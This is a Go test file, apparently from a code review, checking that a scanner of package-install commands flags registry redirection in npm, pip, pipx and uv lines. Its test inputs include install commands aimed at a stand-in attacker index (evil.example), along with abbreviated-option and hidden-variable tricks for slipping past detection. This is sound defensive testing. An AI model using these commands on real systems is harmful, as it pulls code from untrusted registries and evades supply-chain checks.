package installread

import (
	"slices"
	"testing"
)

// Independent review of READER-VAR-OPT-1 (6bf0ed2 on 8db039b), 2026-11-15. Placeholders zz-var-pkg and
// evil.example only. Tool behaviour checked on this Mac with no network writes: npm 10.8.2 (npm config get, and an
// ECONNREFUSED on 127.0.0.1:9), pip 26.2.2, pipx 1.17.2 (its own argparse parser called directly) and uv 0.13.7
// (offline, a hand-made wheel in a local find-links folder).

// reasonless: a line read as a plain install — targets, and no reason from either reader.
func reasonless(line string) bool {
	tg, codes := codesOn(line)
	return len(tg) > 0 && len(codes) == 0
}

// R1 (P2, new in 6bf0ed2). pip's -C (--config-settings) and uv's -C, -P (--upgrade-package), -b
// (--build-constraints) and -m (uv add --marker) take a value, which pyShortRegistry reads as a cluster of
// switches: -Cbuild-dir=build is -C with "build-dir=build", and the "i" in "build" became -i with the index
// "ld-dir=build". meson-python documents -Cbuild-dir=…, scikit-build-core -Cbuild.verbose=true. Each line is
// silent on 8db039b and must stay so.
func TestReviewVarOptConfigSettingsNoHold(t *testing.T) {
	for line, want := range map[string][]string{
		"pip install . -Cbuild-dir=build":                   nil,
		"python -m pip install . -Cbuild.verbose=true":      nil,
		"pip install -v . -Cbuild.verbose=true":             nil,
		"pip install zz-var-pkg -Cbuild-dir=build":          {"pypi:zz-var-pkg"},
		"pip install zz-var-pkg -Clogging.level=INFO":       {"pypi:zz-var-pkg"},
		"uv pip install . -Cbuild-dir=build":                nil,
		"uv pip install zz-var-pkg -Cinstall.strip=false":   {"pypi:zz-var-pkg"},
		"uv add zz-var-pkg -Pfilelock":                      {"pypi:zz-var-pkg"},
		"uv pip install zz-var-pkg -bbuild-constraints.txt": {"pypi:zz-var-pkg"},
	} {
		tg, codes := codesOn(line)
		if len(codes) > 0 || !slices.Equal(tg, want) {
			t.Errorf("%q: targets %v, codes %v; want %v and no reason", line, tg, codes, want)
		}
	}
	// the registry option after such a value is still read
	for _, line := range []string{
		"pip install zz-var-pkg -Cbuild-dir=build -ihttps://evil.example/simple",
		"uv pip install zz-var-pkg -Cx=1 -i https://evil.example/simple",
	} {
		if _, codes := codesOn(line); !slices.Contains(codes, "custom_registry") {
			t.Errorf("%q: codes %v, want custom_registry", line, codes)
		}
	}
}

// R2 (P2, pre-existing; the round's "every accepted spelling"). npm's nopt reads a long option with one dash
// (and its abbreviations): -registry=URL, -reg=URL and -reg URL set the registry, -userc= and -globalc= the config
// files, -@scope:registry= a scope's registry (npm 10.8.2: npm config get, npm view … ECONNREFUSED).
func TestReviewVarOptNpmSingleDashLong(t *testing.T) {
	for line, code := range map[string]string{
		"npm i zz-var-pkg -reg=https://evil.example/":            "custom_registry",
		"npm i zz-var-pkg -registry=https://evil.example/":       "custom_registry",
		"npm -reg https://evil.example/ i zz-var-pkg":            "custom_registry",
		"npm -registry=https://evil.example/ install zz-var-pkg": "custom_registry",
		"npx -reg=https://evil.example/ zz-var-pkg":              "custom_registry",
		"npm i zz-var-pkg -userc=/srv/rc":                        "custom_registry",
		"npm i zz-var-pkg -userconfig /srv/rc":                   "custom_registry",
		"npm i zz-var-pkg -globalc=/srv/rc":                      "custom_registry",
		"npm i zz-var-pkg -@acme:registry=https://evil.example/": "custom_registry",
		"npm create zz-var-pkg -reg=https://evil.example/":       "custom_registry",
		"npx -p zz-var-pkg -reg=https://evil.example/ zzbin":     "custom_registry",
	} {
		tg, codes := codesOn(line)
		if !slices.Contains(codes, code) {
			t.Errorf("%q: codes %v (targets %v), want %s", line, codes, tg, code)
		}
	}
}

// R3 (P2, in the round's own code). pipx run has no --include-deps or --include-resources-from, so argparse
// resolves --in and --i to --index-url there (pipx 1.17.2's parser: run --in /x zz gives index_url "/x"). An index
// can be a local folder (PEP 503 layout), which pkgs skips as a path. Mutant 37 ("pipx: --in") is not equivalent.
func TestReviewVarOptPipxRunIndexAbbrev(t *testing.T) {
	for _, line := range []string{
		"pipx run --in /srv/simple zz-var-pkg",
		"pipx run --i /srv/simple zz-var-pkg",
		"pipx run --in=/srv/simple zz-var-pkg",
	} {
		if _, codes := codesOn(line); !slices.Contains(codes, "custom_registry") {
			t.Errorf("%q: codes %v, want custom_registry", line, codes)
		}
	}
}

// R4 (P2, pre-existing; the row's "a variable ... moved the registry unseen"). A word the line does not show after
// the subcommand, where the tool still reads it as its own option but the reader drops it: npm reads options all
// along an exec, init and create line (npm exec PKG --registry=… and npm create PKG --registry=… reached
// 127.0.0.1:9), npx and npm exec with -p up to the command, uvx --from, uv tool run --from and uv run up to the
// command, uv tool install takes one package (a second word is an error, so a word after it is an option), pipx run
// --spec up to the app (argparse). Each is silent on 6bf0ed2; the same word as a package (npm i x $P) is a reason.
func TestReviewVarOptHiddenAfterSubcommand(t *testing.T) {
	for _, line := range []string{
		"npm exec zz-var-pkg $P",
		`npm exec zz-var-pkg "$P"`,
		"npx -p zz-var-pkg $P zzbin",
		"npm exec -p zz-var-pkg $P zzbin",
		"npm create zz-var-pkg $P",
		"npm init zz-var-pkg $P",
		"npm init zz-var-pkg my-app $P",
		"uvx --from zz-var-pkg $P zzbin",
		"uv tool run --from zz-var-pkg $P zzbin",
		"uv run --with zz-var-pkg $P script.py",
		"uv tool install zz-var-pkg $P",
		"pipx run --spec zz-var-pkg $P zzbin",
	} {
		if reasonless(line) {
			t.Errorf("%q: read as a plain install", line)
		}
	}
	// what the tool hands to the command it runs is the command's: no reason (npx stops at the package; -- ends
	// npm's options; uvx, uv run and pipx run stop at the command)
	for _, line := range []string{
		"npx zz-var-pkg $ARGS",
		`npx -y zz-var-pkg "$@"`,
		"uvx zz-var-pkg $ARGS",
		"pipx run zz-var-pkg $ARGS",
		"uv run --with zz-var-pkg script.py $ARGS",
		"npm exec -- zz-var-pkg $ARGS",
		"npm create zz-var-pkg -- $ARGS",
		"uvx --from zz-var-pkg zzbin $ARGS",
		"pipx run --spec zz-var-pkg zzbin $ARGS",
	} {
		if !reasonless(line) {
			tg, codes := codesOn(line)
			t.Errorf("%q: targets %v, codes %v; want a plain install", line, tg, codes)
		}
	}
}

// R6 (P3). uv tool install's -e is a switch (uv tool install --help: "-e, --editable"), as pipx's is; in a cluster
// pyShortRegistry stops at it as a value-taking -e, so -ei DIR is not read as an index.
func TestReviewVarOptUvToolEditableCluster(t *testing.T) {
	if line := "uv tool install -ei /srv/simple zz-var-pkg"; reasonless(line) {
		t.Errorf("%q: read as a plain install", line)
	}
}
